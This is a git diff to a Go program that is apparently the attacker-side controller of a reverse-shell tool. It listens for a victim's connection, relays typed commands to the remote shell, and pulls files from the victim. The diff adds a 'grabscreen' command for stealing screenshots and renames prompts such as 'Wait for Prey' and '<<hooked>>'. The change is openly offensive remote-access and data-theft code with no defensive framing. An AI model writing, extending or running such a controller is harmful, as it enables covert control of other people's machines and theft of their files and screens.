@@ -16,7 +16,7 @@ import (
 const FILEREADBUFFSIZE = 512
 
 //PORT set server port here
-const PORT = ":4443"
+const LOCALPORT = "192.168.56.1:8080"
 
 func main() {
 	redc := color.New(color.FgHiRed, color.Bold)
@@ -24,19 +24,24 @@ func main() {
 	cyanc := color.New(color.FgCyan, color.Bold)
 
 	var recvdcmd [512]byte //stores output from reverse shell
+	//sleepy := html.UnescapeString("&#" + strconv.Itoa(128564) + ";") //emoticons https://apps.timwhitlock.info/emoji/tables/unicode
+	//sleepy := emoji.Sprint(":sleeping:")
 
-	cyanc.Println("Wait for Prey ...ZZZzzz")
-	listner, _ := net.Listen("tcp", PORT)
+	cyanc.Println("Not Yet Connected ...")
+	listner, _ := net.Listen("tcp", LOCALPORT)
 	conn, _ := listner.Accept()
 	for {
 		reader := bufio.NewReader(os.Stdin)
-		redc.Print("<<hooked>>")
+		redc.Print("[gotcha]")
 		command, _ := reader.ReadString('\n')
 		if strings.Compare(command, "bye") == 0 {
 			conn.Write([]byte(command))
 			conn.Close()
-			os.Exit(0)
+			os.Exit(1)
 		} else if strings.Index(command, "get") == 0 {
+			getFilewithNameandSize(conn, command)
+
+		} else if strings.Index(command, "grabscreen") == 0 {
 			getFilewithNameandSize(conn, command)
 
 		} else {
@@ -70,12 +75,12 @@ func getFilewithNameandSize(connection net.Conn, command string) {
 	connection.Read(bufferFileSize)
 
 	fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
-	fmt.Println("File Size : ", fileSize)
+	fmt.Println("file size ", fileSize)
 
 	connection.Read(bufferFileName)
 	fileName := strings.Trim(string(bufferFileName), ":")
 
-	fmt.Println("File Name : ", fileName)
+	fmt.Println("file name ", fileName)
 
 	newFile, err := os.Create(fileName)
 
